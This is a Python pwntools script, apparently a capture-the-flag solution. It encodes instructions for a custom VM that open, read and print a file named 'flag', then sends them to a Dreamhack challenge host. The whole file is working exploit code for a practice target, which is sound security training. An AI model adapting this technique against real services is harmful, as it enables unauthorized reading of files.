#!/usr/bin/python3
from pwn import * 

context.log_level = "debug"
# arg0 
sys = 1 
lea = 2
mov = 4 
add = 8 
# arg1 
sys_write = 1 
sys_read = 2 
sys_open = 4 

flag = "flag".encode()
payload = b'' 
def pack(a, b, c) -> None:
    global payload
    payload += p8(c)
    payload += p8(a)
    payload += p8(b)
    return None 

for i in range(4):
    # a2[0] = i  
    pack(mov, 1, i)
    # a2[1] = flag[i] 
    pack(mov, 2, flag[i]) 
    # a1[a2[0]] = a2[1] 
    pack(lea, 1, 2)

pack(mov, 1, 0)
pack(mov, 2, 0)
# open(a1, 0)
pack(sys, sys_open, 1)

pack(mov, 2, 0)
pack(mov, 4, 0xff)
# read(open(a1, 0), a1, 0xff)
pack(sys, sys_read, 1)

pack(mov, 1, 1)
pack(mov, 2, 0)
pack(mov, 4, 0xff)
# write(1, a1, 0xff)
pack(sys, sys_write, 4)
# p = process('./prob')
p = remote('host3.dreamhack.games', 18192)
p.sendafter(b'code: ', payload)
p.interactive()
